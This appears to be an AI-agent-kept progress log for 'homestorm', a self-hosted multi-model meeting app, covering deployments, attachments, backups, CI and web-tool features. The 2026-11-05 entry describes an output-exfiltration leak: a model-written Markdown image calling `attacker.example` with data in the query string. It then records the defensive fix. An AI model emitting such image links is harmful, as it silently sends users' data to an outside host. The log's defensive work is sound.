# Progress

A dated log of what was done and decided, newest first. The plan and milestone status live in [plan.md](plan.md).

---

## 2026-11-08

- **Backups stay on the cluster.** The user decided no off-machine copy is needed; the plan's last open "by the user"
  item is closed.

- **Two small fixes:**
  - **A deploy no longer sends open tabs to sign-in.** `SessionGate` took any failure of `/api/me` as signed out, so a
    tab that loaded in the ~15 seconds a deploy restarts the API (one pod, Recreate) went to the sign-in page and lost
    its place. Only a 401 does that now; otherwise it shows "Can't reach homestorm right now. Trying again…" and asks
    again after 1, 2, 4 and 8 seconds, then every 10.
  - **CI on Node 24 actions:** `actions/checkout@v7`, `actions/setup-node@v7`, the Docker actions at llm-gateway's
    versions, and `pnpm/action-setup@v6.1.0` (pinned: `v6` pointed at a release under two weeks old). GitHub warned
    on every run that the old ones target Node 20.
  - **Deployed as `7abe6eb`:** its CI run had no Node 20 warnings. Checked in the browser with `/api/me` blocked
    (restarting the API pod for a real gap is refused in auto mode): the meeting page stayed put, said "Trying
    again…", asked 3 times in 3.5 s, and loaded when unblocked. A 401 still goes to the sign-in page.

- **CI's arch-infra token, like the other apps:** homestorm's `ARCH_INFRA_TOKEN` is now the same fine-grained token
  llm-gateway, homework and homecal use. The deploy key from earlier today was removed from arch-infra, and its secret
  from homestorm. The workflow still takes either.

- **Attachments phase 2: PDF and Word files** ([ADR 0019](adr/0019-pdf-and-word-files-read-in-the-browser.md)). The
  browser reads them into text in a Web Worker (one per file, 20 MB and 20 seconds at most) and attaches the text, so
  the server never parses either format; the API didn't change. `unpdf` 1.9.1 for PDFs (each page marked "[Page N]")
  and `mammoth` 1.13.0 for .docx, pinned, loaded only in the worker. A PDF with no text is refused as a likely scan; a
  damaged, locked or misnamed file says so. The chip reads "text from PDF" or "text from Word". Tested on a two-page
  PDF and a .docx made by LibreOffice and an image-only PDF. Asked first: in homestorm or mcpgw? Neither server: the
  browser, as images already are; mcpgw stays the place for phase 3's retrieval.
  - **Found on the cluster, fixed:** PDFs failed with "quote.pdf undefined." while Word files worked. pdf.js, finding
    itself in a worker, sets itself up as a pdf.js worker on `self` and posts a "ready" message there, which was read
    as the answer. The answer now comes on its own `MessageChannel`. Checked with the bundled worker in a real browser:
    the two-page PDF read, the scan refused, the .docx read, and pdf.js's stray message ignored.
  - **Deployed as `149ddb0`** (CI bumped arch-infra itself) and checked live: a .docx in the brief at creation, a PDF
    on a message (chip "text from PDF · 254 characters"), the scan refused as one, and a DeepSeek Flash seat answered
    the quote number, the 24 TB price and page 2's terms from both files.
  - **Seen while deploying:** the API uses Recreate, so a deploy leaves about 15 seconds with no API, and a tab that
    loads then is sent to sign-in, because `SessionGate` treats any `/api/me` failure as signed out. The login itself
    is kept.
  - **Watch out:** text with invisible characters written as `\u200B`-style escapes came out as the raw characters
    in files written by this session's tools, so `tidy()` builds them with `String.fromCharCode`.

- **Three small fixes:**
  - **Files at creation:** the New meeting dialog takes the brief's images and text files (paperclip, paste or drop),
    and `POST /api/meetings` saves them with the text as one brief version (`briefAttachments`). Files the brief can't
    take get a 400 and leave no meeting behind. The brief editor and this dialog share one limit check.
  - **Named dropdowns:** thinking effort, answer length, context budget and web tools in the seat dialogs are tied
    to their labels, so a screen reader names them.
  - **Seat card:** the seat's own settings sit on their own wrapping line under the model, instead of being cut off
    ("deepseek-v4-pro · no web too…").

- **Three loose ends:**
  - **Argo CD OutOfSync, found:** the database StatefulSet's claim template left out `apiVersion`, `kind` and
    `volumeMode`, which Kubernetes fills in, so Argo's diff never matched. Loki's live template looks the same but its
    chart writes them, and it's Synced. The chart now writes them too; they equal the live values, so applying changes
    nothing (checked with a server-side dry run). homecal, homenews, homeparentcontrol and homework are OutOfSync the
    same way, in their own charts.
  - **Profile's password form** gets a real (hidden) username field. Chrome doesn't count `type="hidden"` and said so
    in the console, so password managers couldn't tie a new password to the login.
  - **CI's arch-infra bump** takes `ARCH_INFRA_DEPLOY_KEY` (a deploy key that can push to arch-infra only) or
    `ARCH_INFRA_TOKEN`. The user set `ARCH_INFRA_DEPLOY_KEY` (the deploy key "homestorm CI: bump image tags", write
    access on arch-infra only); auto mode doesn't write secrets, so the commands in the README were theirs to run.
  - **Deployed as `253b120`** (arch-infra `372f195`, tags by hand): Argo CD shows homestorm Synced and Healthy for the
    first time since 2026-11-03, with the database pod untouched (no restart); the Profile page's console is clean.

- **Fixes from the full meeting test** (below):
  - **`~` isn't strikethrough any more.** Only `~~double~~` is (`singleTilde: false` in `markdown.tsx`), so "~$350
    (~$25/TB)" reads as written.
  - **A repeated tool call isn't run.** The same search or page again in one turn (URLs compared without the
    fragment) gets "you already made this exact call" and doesn't count against the 6 calls. The record and the export
    list each search and page once, which also tidies older turns (`distinctToolCalls`).
  - **The meetings list** says "Minutes posted", "Decision posted" or "Open questions posted" for the latest posted
    wrap-up (a draft doesn't count), and refreshes when seats change or a wrap-up is posted, not only with rounds.
  - **The export** opens with the room rules, and a seat's notes give only its own settings, in the UI's words
    ("web tools: Must search first"). The labels now live in `packages/shared/src/names.ts`.
  - **Settings → Back to meetings** returns to the meeting this tab came from (`sessionStorage`, only `/` or
    `/m/<id>`).
  - **Concise** asks for about 150 to 250 words, and the floor note ends with the same reminder (ADR 0012).
  - **Deployed as `b3de617`** (arch-infra `b8bef5e`, tags by hand) and checked in the test meeting: no strikethrough
    left, the list says "Decision posted · 4 seats", the export opens with the room rules, the repeated page shows
    once, and Back from Settings → Appearance returns to the meeting. Concise, on a similar multi-part question, before
    → after (words, list markers included): Claude 453–653 → 293, GPT 263–294 → 232, DeepSeek V4 Pro 385–402 → 283,
    DeepSeek Flash 511–536 → 257.

- **Message cost from llmgw 0.8.0.** llmgw priced every reply but only logged it, so every message's cost was empty.
  llmgw 0.8.0 adds `cost_usd` to `usage` and returns its own `req_id` in `X-Request-Id`, logging ours as `request_id`.
  homestorm already read both. llmgw's figure for Claude and GPT is a list-price equivalent, not money paid, so a new
  `spendUsd` (`packages/shared/src/names.ts`) shows cost for DeepSeek only, on the answer line, in the header total and
  in the export. ADR 0009 updated. Checked: llmgw run locally against DeepSeek Flash (a stream ended with
  `cost_usd: 0.000009`, and `request_id` was on its log lines); a new API test exports DeepSeek's cost and not Claude's.
  - **Deployed:** homestorm `ad1abb9` (arch-infra `b6e3d93`, tags by hand) and llmgw 0.8.0 (`85f306c`, PR #53, which
    its CI rolled out). Checked live in the test meeting: a DeepSeek Flash answer reads `$0.0017` and the header
    `DeepSeek $0.0017`; Claude's $0.0536 list-price figure is stored but not shown; both turns are in llmgw's log
    under homestorm's `request_id`, and each message stores llmgw's `req_id`.

- **A full meeting test on the cluster** through Playwright, with the user signed in ("E2E test: NAS is 93% full…",
  safe to delete). Four seats (Claude Sonnet 5.5, GPT-6 Luna, DeepSeek V4 Pro, DeepSeek Flash), a CSV and a chart in
  the brief, a quote photo and a .md file on a message, the web tools room rule changed partway, in turn, Reply to, an
  @mention, an edited brief, a Decision wrap-up, the export and dark mode. All 16 turns finished, with no API errors;
  DeepSeek cost about $0.12. Every seat read the files, including V4 Pro through llmgw's image descriptions, and web
  tools followed each seat's setting through the rule changes.
  - **Found:** a `~` meaning "about" turns text into strikethrough when another `~` follows (remark-gfm's single
    tilde); "Concise" is loosely followed (Claude and Flash wrote about 3,500 characters); the meetings list says
    "Minutes written" for any wrap-up, posted or not; the export's seat notes show `web tools: must` instead of the
    label; a seat can fetch the same page twice in a turn; Settings' "Back to meetings" goes to `/`, not the meeting.
    Seen once and not reproduced: the brief editor closing by itself, and message text doubling after an @mention.
  - **Not homestorm's:** DeepSeek V4 Pro thought for 168 s (9,509 output tokens at Low effort) in round 1; the empty
    cost is fixed above.

- **Both changes below deployed as `539daf2`** (CI green; image tags updated by hand in arch-infra `79048f6`, since
  `ARCH_INFRA_TOKEN` is still unset).
  - **Migration 0007 ran at API start on the live database.** 13 seats follow the room rule, 9 keep "on", the 6
    meetings start Off, and all 76 messages are there, the same as on the copy. A backup from just before is on the
    cluster: `homestorm-20261108T062747Z.dump`.
  - **The live app:** API `/health` ok, its logs all JSON. `/settings/profile` and `/settings/appearance` are served,
    with the appearance script in `<head>`. The bundles have the new text and no "Search the web".
  - **Seen, not caused by this:** Argo CD shows the `homestorm-db` StatefulSet OutOfSync. Its spec hasn't changed
    since 2026-11-03 (generation 1) and the chart didn't change, so it's an older diff, still to look at. The database
    container restarted at 05:38 UTC when the host rebooted, and shut down cleanly.

- **Settings, with Profile and Appearance** ([ADR 0018](adr/0018-settings-profile-and-appearance.md)). Asked for by the
  user, modeled on homework's settings, with Change password moved into Profile.
  - **The area:** `/settings`, with its own sidebar (Back to meetings, Profile, Appearance) that is an icon rail on
    phones. You open it from the profile menu, which now holds Settings and Sign out and also sits at the bottom of
    the folded meetings rail. The Change password dialog is gone.
  - **Profile:** name and sign-in email through a new `PATCH /api/me`, which stores the email lower case and answers
    409 for an email in use. Then the password: current, new and confirm. The profile menu shows a new name at once.
  - **Appearance, per browser:**
    - Homework's palettes (Default is homestorm's own, then Solarized, Nord, Dracula, High contrast), mapped onto
      homestorm's color tokens. Each palette's accent is its primary color, and the source colors stay fixed.
    - Light, Dark or System (the default).
    - A size from 75 to 150%, which scales the root font size.
    - An inline `<head>` script applies these before the first paint, and `ThemeProvider` follows later changes.
    - Code blocks get GitHub Dark colors in dark mode.
    - A unit test runs that script against a stand-in page. It caught a stored palette named "constructor" passing
      the lookup, now fixed.
  - **Checked in a real browser**, on a scratch database:
    - The menu opens Settings. A name change shows in the menu at once.
    - A wrong current password is refused, and the right one changes it.
    - Dark mode switches at once, and reads well on a live meeting, including a highlighted code block.
    - Nord at 115% applies on reload before React starts.
    - At phone width, the sidebar becomes an icon rail.
  - **Tests:** `PATCH /api/me` against Postgres. It checks validation, a lower-cased email, that the session carries
    on, that the new email signs in and the old one doesn't, and that it needs a session.

- **Web tools became a room rule, and the chair's "Search the web" was removed**
  ([ADR 0017](adr/0017-web-tools-room-rule.md)). Asked for by the user, who didn't need the chair's search and wanted
  web tools set once for the room, as answer length is.
  - **Removed:** the button in the message box, `POST /api/meetings/:id/search`, `engine.search()`, and the helper that
    wrote its message. Old Sources messages (one in the live data) still show, seats still read them, and their
    links still count for the URL rule.
  - **Added:** `meetings.web_access`, starting Off, in the Room rules box as Off / Can search / Must search first. A
    seat's `web_access` is now null by default and follows it. The seat dialogs offer "Room rule (now …)" or the
    seat's own setting. Changes add event lines, and the export lists each seat's effective setting.
  - **Migration 0007:** seats with web tools off were set to follow the room rule; seats with them on kept that. Run
    on a copy of the live data (a backup taken just before, `homestorm-20261108T062747Z.dump`): 13 seats now follow
    the room rule, 9 keep "on", the 6 meetings start Off, and all 76 messages are there.
  - **Tests:** the chair-search tests became room-rule tests (a seat follows it, its own setting wins either way, and
    Must search first forces the search) and old-Sources tests. Plus a route test for the rule, its events and the
    export, and that `/search` is gone.

## 2026-11-07

- **Nightly database backup** (the user's "go 1"). The database had no backup, and attachments live in it.
  - **In the chart:** a CronJob at 03:30 New York time runs `pg_dump` with the database's own image, so the versions
    always match, into a `homestorm-backup` volume. It keeps the newest 14. The volume is marked so Helm and Argo CD
    never delete it.
  - **Safe by construction:** a dump is written under a temporary name and must read back with `pg_restore --list`
    before it counts. Old dumps are pruned only after a good one, so failing nights never empty the volume. Each run
    logs one JSON line, `backup.done` or `backup.failed`.
  - **`scripts/backup.sh`:** `list`, `now`, `fetch` (a copy to this machine, for an off-disk copy) and `restore` (one
    transaction, then the API restarts). local-path folders are root-only on arch, so list and fetch use a short-lived
    read-only pod.
  - **Checked locally,** with the cluster's image and user (999) against a throwaway database:
    - dumps written and pruned to the newest few, with other files left alone;
    - a wrong password gave `backup.failed` and left no partial file;
    - a meeting deleted by mistake came back with its messages, seats and the migrations table, and the app read it.
  - **On the cluster** (`63b39e9`, deployed on the user's "go push"): the first backup, taken with `backup.sh now`, was
    83,540 bytes. `list` showed it, `fetch` brought it here, and it restored into a scratch database with the same 6
    meetings and 75 messages as the live one. Argo CD shows homestorm Healthy once the volume is attached. The first
    nightly run is at 03:30.
  - **Still open:** it's on the same disk as the database, so it covers mistakes, not a lost disk. Where an off-machine
    copy goes is the user's call.
- **UI, at the user's request:**
  - **The brief moved to the header.** Brief, left of Export, shows it pinned under the header, where it stays while
    the transcript scrolls. It used to be a card at the top of the transcript, which scrolled away. With no brief it
    reads Add brief and opens the editor. A newly added brief opens there, so the chair sees where it lives.
  - **A ⋯ menu on each meeting in the list,** with Delete meeting…. The first click only asks again inside the menu
    ("Yes, delete it" / Cancel), with no dialog. A live meeting's round stops first. Deleting the open meeting goes
    back to the start page.
  - **Both side panels fold** into narrow rails on wide screens. The meetings rail keeps Show and New meeting. The
    seats rail keeps Show, Add seat and each seat's avatar, ringed while it answers. The browser remembers both. On
    phones, the same button closes the panel.
  - **Checked** in a real browser against a throwaway database, at desktop and phone width: the brief panel with a
    40-line brief, Add brief, folding and the reload that keeps it, Cancel, deleting another meeting, and deleting the
    open one. 132 fast tests pass.
  - **Deployed** with the backup (`63b39e9`): CI green, tags bumped by hand in arch-infra, and the new web bundle served.
- **Seats get 6 web calls per turn, up from 4.** In a real meeting on the cluster, all six answers used all 4, and in the second round no
  seat could open a news article.
- **Links stop at Chinese punctuation,** in answers and in the rule on which URLs seats may read. A bare link ran on into the sentence after
  it and went nowhere. Where a Chair's link runs straight into Chinese letters, there's no telling where it ends, so both forms are allowed.

## 2026-11-05

- **M9 done: web tools through mcpgw** ([ADR 0014](adr/0014-tools-through-mcpgw.md)). The date in the intro, the chair's
  "Search the web", a per-seat web setting, and the tool loop.
  - **Checked first, on real models with thinking on, and it changed the design:**
    - with `tool_choice: "none"` to force a final answer, DeepSeek wrote its raw `<｜｜DSML｜｜tool_calls>` markup into the
      answer, and Claude Opus returned no text. So the final answer now gets the research as plain text and no tools at
      all, which worked on every family;
    - `tool_choice: "required"` fails on Claude models that think, so "must search" names `web_search`.
  - **A leak found on the way:** answers rendered Markdown images, so a model could make the browser send
    `![](https://attacker.example/?data=…)` with no click. Images in answers no longer load; they show as
    `[image: description]`.
  - **The URL rule:** a seat may only read links from the Chair or a search. The rule runs in homestorm, since mcpgw can't
    tell where a URL came from.
  - **Built:** migration `0006_web_tools` (`seats.web_access`, `messages.tool_calls`, `author_kind = 'sources'`), the
    `mcpgw` client, `engine/tools.ts`, the loop in `runTurn`, `POST /meetings/:id/search`, the seat setting, the Sources
    card, the tool line under answers, and the export.
  - **Checked:**
    - 133 API tests and 19 web tests, with 53 new test cases on the loop, the URL rule, the client and the rendering;
    - a real meeting in a real browser on localhost, against the real llmgw and mcpgw, in a throwaway database. A chair
      search; then a blind round with DeepSeek Flash, GPT-5.6 Luna ("must search") and Claude Haiku 5.5 all searching,
      reading and citing up to the limit, with DeepSeek V4 Pro (tools off) answering from the chair's search. All of them
      correctly said PostgreSQL 18 is stable and 19 is at release candidate;
    - **the rule, for real:** DeepSeek Flash tried a URL from memory and was refused before reaching mcpgw, the chair saw
      it in amber, and the seat said honestly that it couldn't read the page. A seat told to write a Markdown image got
      `[image: chart]`, with no `<img>` and no request sent. mcpgw's logs show 16 calls from homestorm with per-turn IDs,
      and the refused address never arrived.
  - **On the cluster:** the images deployed and the migration landed, with all 3 meetings and 42 messages intact. homestorm's
    real client searched through mcpgw from its pod, and had a fetch of llmgw refused by name.
  - **Not checked on the cluster with a real meeting:** that needs the admin login. It's the user's to try.

## 2026-11-04

- **An exhausted allowance no longer blocks a seat** ([ADR 0002](adr/0002-llm-access-through-llmgw.md), the user's
  call). Claude seats were refused because llmgw said `exhausted` with 10% of the week left: it reads Anthropic's
  near-limit severity as exhausted, while Claude still answered. Now only a model that isn't on the plan is refused;
  the card says "Allowance low" or "Out of allowance" in amber or red; a real provider refusal (a 429 about quota,
  balance or a usage limit) shows on the message as "Out of allowance". Checked: a Claude Haiku seat at 9% left
  answered, with its real 483-token prompt count.
- **llmgw 0.6.0 picked up** (it fixed what homestorm had reported).
  - **Image support:** the image hint reads `/v1/models` `input` instead of homestorm's own list.
  - **Real token counts:** streamed answers now carry usage, so messages save real counts. The context meter shows
    llmgw's count ("Context 941 of 120k", without ≈) and keeps the estimate in its tooltip; amber and trimming still
    follow the estimate.
  - **A Claude workaround:** llmgw reports only Claude's uncached prompt as `prompt_tokens`, so homestorm uses
    `total − completion` when that's larger. Found by checking a cached 7.2k prompt (reported as 4).
  - **Checked:** 124 tests; in the browser, the V4 Pro card showed llmgw's 941 against our ≈1,630 estimate.
  - **Seen on the way:** llmgw reports Claude `exhausted` with 10% of the week left (resets 2026-11-06), so Claude
    seats are refused until then.
- **Attachments, phase 1** ([ADR 0016](adr/0016-attachments-images-and-text-files.md)). Images and text files on
  the chair's messages and in the meeting brief.
  - **llmgw checked first:**
    - images work for Claude, GPT and DeepSeek Flash, streamed or not, several per message;
    - DeepSeek V4 Pro gets llmgw's text description instead;
    - a `file` part is refused, so text files are inlined by homestorm.
  - **Built:**
    - paperclip, drag and drop and paste, with browser-side resizing (a 4000×2250 photo became 2048×1152 WebP);
    - server checks with `image-size`;
    - an `attachments` table (migration `0005_attachments`);
    - image parts and inline `<file>` blocks in views, the brief's images pinned at the top, image tokens in budgets;
    - thumbnails, a full-size viewer, the export, and a hint naming seats that can't see images.
  - **Found and fixed while testing:**
    - **V4 Pro mixed up images from different messages.** llmgw's fallback writes one description per user message,
      at its start, and homestorm had merged the brief's images with a question's. Now each image-carrying message
      stands alone, with its names in a label after the images; V4 Pro then answered right.
    - **Stop all could miss a turn still setting up** (no abort controller yet). The turn now checks for a stop as
      soon as it registers. A test that waits on this had started timing out.
  - **Checked:**
    - 123 tests;
    - in the browser on localhost, with Claude Haiku, GPT-5.6 Luna and DeepSeek V4 Pro:
      - every seat read both images and the code word from a text file;
      - all three read the brief's image and spec;
      - the viewer, the brief editor and the export worked.
  - **For llmgw** (listed in ADR 0016): describe images one by one in place, separate a message's text parts, cache
    descriptions, and say which models take images.
- **Meeting brief and a new full-context policy** ([ADR 0015](adr/0015-meeting-brief-and-full-context-policy.md)).
  - **The brief:** standing context the chair writes (optional in New meeting, editable from a card pinned at the
    top). Every seat gets it in its intro after the title, and it's never trimmed. It follows the meeting clock
    (`author_kind = 'brief'`, one message per version, migration `0004_brief_author_kind`), so a blind round shares
    one version and Retry repeats it. A change after the discussion started leaves "(The Chair updated the meeting
    brief…)" in later views; the transcript shows "You updated the meeting brief · show this version"; the export
    puts the current brief at the top. Capped at 12,000 characters.
  - **Over budget:** the intro (with the brief), the first question, the latest posted wrap-up and the newest turns
    stay; turns before the wrap-up go first ("…the summary below covers them"), then the oldest after it.
  - **The chair's summaries:** "Copy into the brief" on a posted wrap-up opens the brief editor with it appended.
    The context bar turns amber at 80% and says "Trimming older turns" once a turn was trimmed; the message box then
    suggests minutes.
  - **Context % on the seat card:** "Context ≈6.4k of 120k · 5%", with the share of the model's window in a tooltip.
    It's our own estimate: llmgw 0.5.0 returns `usage` for non-streamed calls only (checked again today), and
    homestorm streams.
  - **Checked:** view, engine (Retry keeps the old brief), route, export and web tests (114 in all). In the browser
    on localhost, a throwaway meeting with a DeepSeek Flash seat answered "Pixel" from the brief, then "Nova" after
    the brief changed, noting the change. Found and fixed there: the export said "set" for every brief version.
- **Tools planned, through mcpgw** ([ADR 0014](adr/0014-tools-through-mcpgw.md), M9 in [plan.md](plan.md)). Models
  behind llmgw can't look anything up. Tools will come from a new home-cluster gateway, **mcpgw** (design at
  `~/agentic/mcpgw/docs/design.md`), and homestorm will run the tool loop: the date in the intro, then chair search,
  then seat tools.
- **Tool loop tried with a fake MCP server** against the real llmgw. Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek
  Flash each chose to search for a price, wrote their own query and quoted the fake result. None searched for a
  question they already knew. They trusted the fake source differently (Claude doubted it, GPT didn't), so sources
  must stay visible. Scripts kept at `~/agentic/mcpgw/dev/tool-loop-demo/`.
- **GPT plan changed** (details in `private/notes.md`): all seven GPT models are available now. homestorm picked it
  up from llmgw with no change.

## 2026-11-03

- **Context budget per seat:** Small (32k), Standard (120k, the default), Large (half the window) or Full (the whole
  window minus room for the answer), in the Add seat and Edit seat dialogs, each showing its size for that model
  and the model's window ([ADR 0012](adr/0012-long-meetings-answer-length-effort.md)). The seat card shows "Context
  ≈6.4k of 120k" with a bar. Large and Full warn that a long meeting re-sends that much every turn. Migration
  `0003_seat_context_budget` adds `seats.context_budget` and `messages.view_tokens`; the budget math moved to
  `packages/shared/src/budget.ts` so the web shows the API's numbers. What to do when a meeting outgrows its
  budget (only trimming today) is still open.
- **Removed the "New questions go to" room rule.** It only chose where the message box started; the server never
  read it, and having it next to the message box's own selector confused people. Now the message box starts on
  Everyone · blind and keeps your pick after sending; the @mention toggle and the Reply to… picker also start on
  Blind (the picker started on In turn). Migration `0002_drop_default_mode` drops `meetings.default_mode`; nothing
  else read it. Room rules now holds only answer length and the two fixed rules.
- **A seat can have its own answer length:** Room rule (the default), Concise, always, or Detailed, always, in the
  Add seat and Edit seat dialogs. The chair's message still wins for one turn, then the seat's setting, then the room
  rule ([ADR 0012](adr/0012-long-meetings-answer-length-effort.md)). The intro line and the output cap follow it; the
  seat card shows "Detailed answers"; setting it adds an event line; the export lists it. Migration
  `0001_seat_answer_length` adds a nullable `seats.answer_length`. The seat menu's "Edit name and persona" is now
  "Edit seat…". Covered by unit, view, engine and route tests; checked in the browser on localhost.
- **Live test on localhost:** a 5-seat meeting run step by step, with the chair deciding each question from the
  answers. The seats were Claude Opus 5.5, GPT-6 Luna, DeepSeek V4 Pro, "The Skeptic" (GPT-6 Luna with a persona)
  and "Scribe" (DeepSeek Flash, muted). The topic: one shared Postgres for the cluster's apps, or one per app.
  - **Rounds:**
    - a blind first round (2–2);
    - an in-turn reaction round;
    - a reply to one message with two seats answering blind;
    - a comment with checked cluster facts (one node, local-path, five databases, no backup jobs);
    - @mentions with a new constraint;
    - a Detailed round with Stop, Keep partial, Skip and Retry;
    - blind final positions (unanimous: back up now, consolidate later);
    - a decision written by Scribe, then the export.
  - **Everything matched the design:** cutoffs in blind and in-turn rounds, comments, targets, Retry with the saved
    cutoff and its 409 once others have spoken, a muted seat writing the wrap-up, and the persona.
  - **Found and fixed:**
    - the output cap left no room for thinking (below);
    - the floor note said "All 2 participants": now "Both participants";
    - a kept partial reached other seats unmarked: it now ends with "(The Chair stopped this answer here.)"
      ([ADR 0013](adr/0013-intro-and-floor-note-templates.md));
    - room-rule changes left no event line: they now add "You set answers to Detailed";
    - the export dropped skipped turns, didn't name who a reply went to, and cut personas mid-word.
  - **Wrap-ups are now held back for review.** Scribe's decision had the right answer but several wrong details
    (it counted itself as a participant and put The Skeptic on the wrong option). A wrap-up now starts "not
    posted", with **Post to the meeting** under it; posting adds an event line. "Post it right away" in the dialog
    skips the review.
- **Fix: DeepSeek V4 Pro returned an empty answer** in the live test's blind round ("empty_answer" after 46 s).
  llmgw's usage line showed exactly 2,048 output tokens: the Concise cap. DeepSeek counts thinking inside
  `max_tokens`, so it spent the whole cap thinking.
  - **Checked where the fault was,** with the same view sent straight to DeepSeek and through llmgw: both work.
    DeepSeek's thinking length varies a lot on the same question (35 to 1,116 tokens at `low`, up to 2,175 at
    `high`). llmgw turns `low` into `high` for this model and doesn't forward the level (its model data lists only
    `high` and `max`); that's noted for llmgw, not changed.
  - **Fix in homestorm:** `max_tokens` is now the answer room plus thinking room by effort (low 8,192, medium 16,384,
    high 32,768), within the model's own limit. Concise at low effort is 10,240
    ([ADR 0012](adr/0012-long-meetings-answer-length-effort.md)). The "empty answer" problem now names the limit.
  - Covered by unit tests (`maxOutputTokens`) and an engine test of what each seat is sent.
- **Fix: two seats could share a name.** Several seats on one model are fine (each is its own participant with its
  own view, persona and effort), but the Add seat dialog pre-filled the plain model name, which skipped the API's
  "(2)" suffix. Both twins were then called "Claude Opus 5.5": each saw the other's answers under its own name, and
  its participant list marked both as "(you)".
  - Seat names are now unique within a meeting, ignoring case and counting removed seats (their messages keep their
    names). The dialog suggests the next free name; adding or renaming to a taken name is refused (409), with the
    reason shown under the name field.
  - Covered by unit tests (`uniqueSeatName`, `seatNameClash`) and an integration test; checked in the browser.
- **Fix: Postgres notices broke the JSON log contract.** postgres-js prints NOTICEs with `console.log` as multi-line
  objects. The boot migration gets two on every restart after the first ("schema drizzle already exists, skipping"),
  so the cluster logs had plain-text lines. Notices now go to the logger as `db.notice` at debug level; an
  integration test checks that nothing reaches `console.log`.

## 2026-11-02

- **M8 done: homestorm is live** at http://homestorm.arch.internal (API http://homestorm-api.arch.internal).
  - Dockerfiles, the Helm chart (api with Recreate, web, Postgres StatefulSet), CI and the Argo CD Application,
    adapted from homework. The api reaches llmgw in-cluster at `llmgw.llmgw.svc.cluster.local`.
  - The production images ran a real meeting locally before shipping. CI passed; the GHCR images pull anonymously,
    so the cluster needs no pull secret.
  - **First sync found a chart bug:** the Helm pre-install migrate hook ran before the Postgres StatefulSet existed
    and waited forever. Fix: the API applies its migrations at boot, retrying while Postgres starts; the hook is off.
    The stuck sync carried the old parameters, so it was ended (operation marked Terminating) and a fresh sync ran.
  - Checked on the cluster: `/health` OK; unauthenticated calls 401; setup page; sign-up and the session cookie
    across the two hosts; a blind round streamed through Traefik (DeepSeek V4 Pro showed "Thinking…"); in Loki,
    `db.migrated`, `server.start` and three `turn.done` lines sharing the action's `req_id`, and no non-JSON lines.
  - The admin made for that check was deleted, so `/setup` is open for the user. The meeting stays.
  - The Secret `homestorm-secrets` was created by the user (auto mode doesn't allow Secret writes); values are in the
    gitignored `private/cluster-secrets.env`.
  - Argo shows the Postgres StatefulSet as OutOfSync, as it does for homework's: the cluster-wide StatefulSet diff.
  - Open: `ARCH_INFRA_TOKEN` isn't set on this repo, so CI skips the arch-infra tag bump; tags were bumped by hand.
- DNS: `homestorm.arch.internal` and `homestorm-api.arch.internal` point at Traefik (added by the user).
- **M7 done: wrap up, export, login.** Wrap-up (minutes, decision, open questions; posted or kept from the seats) and
  the Markdown export were built with M5/M6 and checked in the browser run. Login gained Change password, covered by
  an integration test.
- **M6 done: web UI.**
  - **Three panes, as in the mockup:**
    - meetings list (new, search, grouped by day, Live and Minutes badges, the chair's menu);
    - the meeting (header with status, tokens, Export, Wrap up; chair bubbles on the right with where each went;
      seat messages with source tag, Markdown and the mono meta line; round boxes with progress; event lines;
      problems in place with Retry / Skip / Keep partial / Mute until reset);
    - the seats panel (status in words, allowance bar, Ask / Mute / ⋯, room rules).
  - Message box: send-to selector, @mentions that become structured targets, blind / in-turn toggle for several
    seats, Stop all, and a status line while a round runs.
  - Dialogs: new meeting, add seat (models grouped by source with allowance, "Not on your plan" crossed out),
    edit seat, reply-to picker, wrap up, delete. Live state comes from the stream through a tested reducer.
  - **Driven in a real browser** (Playwright, localhost, real llmgw): a blind round streamed from all three seats;
    reply-to with a note; an @mention; Stop and Keep partial; mute; minutes written by GPT and posted; Markdown
    export; phone width.
  - **Bug found and fixed in that run:** the openai SDK ends a stream quietly when it's aborted, so Stop saved a
    cut-off answer as done. The client and the engine now treat an aborted stream as stopped; a regression test
    covers it.
  - Accessibility: the @mention list is a proper combobox, labels on every control, states in words.
- **M5 done: meeting engine.**
  - The engine runs rounds in the API process: blind rounds start every seat at the same clock value; in-turn rounds
    start each seat after the previous answer entered the record. One running round per meeting; comments any time.
  - Stop keeps the partial text hidden until the chair keeps it. Retry reuses the message's cutoff, so the seat gets
    the same view and the same model. Seats out of allowance, or not on the plan, are refused before any llmgw call.
    Empty answers and llmgw errors (429, 404, context too long) stay on the message.
  - Live stream per meeting: a snapshot on connect, then message, delta (with offsets), round, seat and meeting
    events, with a heartbeat. A restart turns answers left streaming into `stopped`.
  - Routes for meetings, seats (mute, move, remove, with event lines), the action API, wrap-up, stop, retry, keep,
    skip, allowance, models and Markdown export.
  - 48 API tests (13 engine and 7 route integration tests, with a scripted llmgw).
  - **Real run on localhost:** "cache at the edge or in the API?" Blind round, all three answered independently
    (3 s). Then an in-turn round where each built on the others by name (8 s). 360 deltas reached the live stream.
    Turn log lines carry the action's `req_id`, so one Loki query shows the chair's action and every turn it caused.
  - Fixed: the meetings list counted 0 seats. Drizzle rendered `${meetings.id}` unqualified inside the subqueries.
- **M4 done: scaffold.**
  - `apps/web`: Next.js 15, Tailwind 4, shadcn components, Geist fonts, the theme with source colors. Builds.
  - API skeleton: config, pino logs in the house shape, Better Auth with one admin (sign-up closes after the first
    account), `reset-password` script.
  - llmgw client on the `openai` package with `maxRetries: 0`, so failures stay visible. The live smoke test
    streamed from Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash, and got `model_not_found` for an unknown model.
  - Found: DeepSeek Flash can spend a tiny output cap on reasoning and return no text. homestorm will show that as
    an "empty answer" problem instead of a blank message.
  - Integration tests use a separate `homestorm_test` database, created and migrated automatically.
- **M3 done: data model and per-seat view.**
  - Workspace skeleton: pnpm + Turborepo, `packages/shared` (domain types, the action schema, display names) and
    `apps/api`.
  - Drizzle schema and first migration: meetings, seats, rounds, messages, plus Better Auth's tables.
  - The visibility rule is stored as a per-meeting **logical clock**: `visible_seq` when a message enters the record,
    `cutoff_seq` when a turn starts. Views are ordered by `visible_seq`, so they only ever grow at the end
    ([data-model.md](data-model.md)).
  - `buildView`, the intro and floor-note templates, and trimming, with 21 unit tests (45 across the workspace).
  - Local Postgres runs on `127.0.0.1:5433` (`scripts/db-start.sh`).
- **M2 done: decisions recorded.**
  - D1 v1 scope: [ADR 0009](adr/0009-first-version-scope.md).
  - D2 server-run rounds, one SSE stream per meeting: [ADR 0010](adr/0010-rounds-run-on-the-server.md).
  - D3 one admin login: [ADR 0011](adr/0011-one-admin-login.md).
  - D4 trimming, answer length, thinking effort: [ADR 0012](adr/0012-long-meetings-answer-length-effort.md).
